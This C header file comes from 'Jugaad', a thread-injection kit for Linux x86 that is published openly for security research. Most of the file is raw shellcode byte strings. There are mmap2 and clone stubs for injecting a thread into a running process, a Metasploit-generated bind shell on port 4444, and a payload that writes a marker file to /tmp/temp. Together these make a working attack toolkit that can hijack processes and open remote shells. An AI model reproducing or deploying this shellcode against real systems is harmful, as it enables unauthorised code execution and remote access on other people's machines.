/*
 * Jugaad - Thread Injection Kit
 *
 * Author: Aseem Jakhar
 * Organization: null - The open security community
 * Websites: http://null.co.in   http://nullcon.net
 *
 * Copyright (c) 2011-2021 Aseem Jakhar <aseemjakhar_at_gmail.com>. All rights reserved.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 * BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
 * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 */


#ifndef _shellcode_h_
#define _shellcode_h_

#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */

/*
 * The stub for mmap2 shellcode. The values of length, prot and flags is
 * updated in the stub to make the final customized payload.
 */
#define MMAP2_STUB          "\x31\xdb"             \
                            "\xb9\x10\x27\x00\x00" \
                            "\xba\x07\x00\x00\x00" \
                            "\xbe\x22\x00\x00\x00" \
                            "\x31\xff"             \
                            "\x31\xed"             \
                            "\xb8\xc0\x00\x00\x00" \
                            "\xcd\x80"             \
                            "\xcc"

/* Offsets into the stub shellcode for changing the values */ 
#define MMAP2_LEN_OFFSET    3
#define MMAP2_PROT_OFFSET   8
#define MMAP2_FLAGS_OFFSET  13

#define WORD_SIZE sizeof(long) 

/*
 * Shellcode STUB for creating a thread. It uses the clone syscall. For this shellcode to run
 * it requires the following to be set in the STUB:
 *    1. The stack bottom address in %ecx register.
 *    2. The function pointer address in %ebx register.
 *    3. clone flags.
 * 1. The stack bottom address means when we allocate memory using mmap shellcode we
 * have to pass the address of the last byte of the mmap'ed memory, for example
 * if we we allocate 10 bytes at address 0x00 the bottom of the stack would be
 * 0x09. Simple!
 * 2. The clone shellcode stub uses relative addressing (and sets ebx) to jump to the thread payload
 * specified by the caller. Hence, we need to append the thread payload to the
 * CLONE_STUB_HEAD so that it calls clone and jumps to the payload in the child thread
 * and execute int3 instrution in the main thread. 
 * 3. Clonse flags are the same what are used for clone system call.
 * 
 * The CLONE_STUB_TAIL is exit syscall and is further appended to the payload making
 * the work of the caller easier by not requiring them to specifically exit when 
 * the job is done. So, the Thread shellcode when prepared will look like:
 * [CLONE_STUB_HEAD|Caller_payload|CLONE_STUB_TAIL]
 *
 * This shellcode is not complete as we need to provide the value of %ecx which is the address
 * of the stack bottom. One way to do it is via setregs in ptrace and set the value of
 * ecx to the stack bottom address, but in that case the shellcode is not independent i.e
 * it still depends on external ptrace setregs to make it executable in the remote process.
 * The above shellcode has the stub for movl  address, %ecx which we can update when creating the
 * shellcode through just the passed argument to shellcode_thread() function.
 */

#define CLONE_STUB_HEAD      "\xeb\x44"                     \
                             "\xb9\x00\x00\x00\x00"         \
                             "\x5b"                         \
                             "\x83\xe1\xf0"                 \
                             "\x83\xe9\x1c"                 \
                             "\x31\xc0"                     \
                             "\x89\x41\x0c"                 \
                             "\x89\x59\x08"                 \
                             "\xc7\x41\x04\x00\x00\x00\x00" \
                             "\xbe\x00\x00\x00\x00"         \
                             "\xba\x00\x09\x01\x00"         \
                             "\xbb\x00\x09\x01\x00"         \
                             "\xbf\x00\x00\x00\x00"         \
                             "\x89\x19"                     \
                             "\xb8\x78\x00\x00\x00"         \
                             "\xcd\x80"                     \
                             "\x85\xc0"                     \
                             "\x74\x01"                     \
                             "\xcc"                         \
                             "\xbd\x00\x00\x00\x00"         \
                             "\xeb\x05"                     \
                             "\xe8\xb7\xff\xff\xff"

#define CLONE_STUB_TAIL      "\x31\xdb"                     \
                             "\xb8\x01\x00\x00\x00"         \
                             "\xcd\x80"

#define CLONE_STK_BOTTOM_OFFSET  3
#define CLONE_FLAGS_OFFSET1      35
#define CLONE_FLAGS_OFFSET2      40


/*
 * Couple of payloads to test jugaad.
 *
 * TCP_BIND4444 - Generated from msfpayload, it creates a tcp_bind shell on port 4444 
 */
#define TCP_BIND4444         "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66" \
                             "\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51" \
                             "\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04" \
                             "\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f" \
                             "\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f" \
                             "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
/*
 * WRITE_FILE - Creates a file /tmp/temp and writes "Jugaadu was here" in that file
 */
#define WRITE_FILE   	"\x31\xc0"                          \
			"\x31\xdb"                          \
			"\x31\xc9"                          \
			"\x31\xd2"                          \
			"\xeb\x23"                          \
			"\x5e"                              \
			"\x8d\x1e"                          \
			"\xb0\x05"                          \
			"\x66\xb9\x42\x0c"                  \
			"\x66\xba\xc0\x01"                  \
			"\xcd\x80"                          \
			"\x31\xd2"                          \
			"\x8d\x4b\x0a"                      \
			"\x89\xc3"                          \
			"\xb0\x04"                          \
			"\xb2\x11"                          \
			"\xcd\x80"                          \
			"\x31\xc0"                          \
			"\x31\xdb"                          \
			"\x40"                              \
			"\xcd\x80"                          \
			"\xe8\xd8\xff\xff\xff"              \
			"/tmp/temp\0jugaadu was here\n"


/*
 * This structure represents a shellcode object. The payload is
 * not supposed to end with a terminating NULL as a convention.
 * The user must make sure it does not end with 'C' NULL character
 * due to the use of string manipulation functions when creating
 * an object.
 */
struct shellcode
{
    unsigned char * payload; /* The actual binary payload */
    size_t          psize;   /* Size of the payload not including
                                the terminating NULL */
};

struct shellcode *   shellcode_alloc(size_t psize);
struct shellcode *    shellcode_copy(unsigned char * payload,
                                     size_t psize);

int  shellcode_append(struct shellcode * this,
                      unsigned char * payload,
                      size_t psize);
void   shellcode_free(struct shellcode ** this);

struct shellcode *  shellcode_mmap2(size_t length,
                                    int prot,
                                    int flags);
struct shellcode * shellcode_thread(unsigned char * tpayload,
                                    size_t tpsize,
                                    void * child_stack,
                                    int flags);
size_t shellcode_get_threadcode_size(size_t payload_size);

#ifdef __cplusplus
}
#endif /* __cplusplus */

#endif /* _shellcode_h_ */
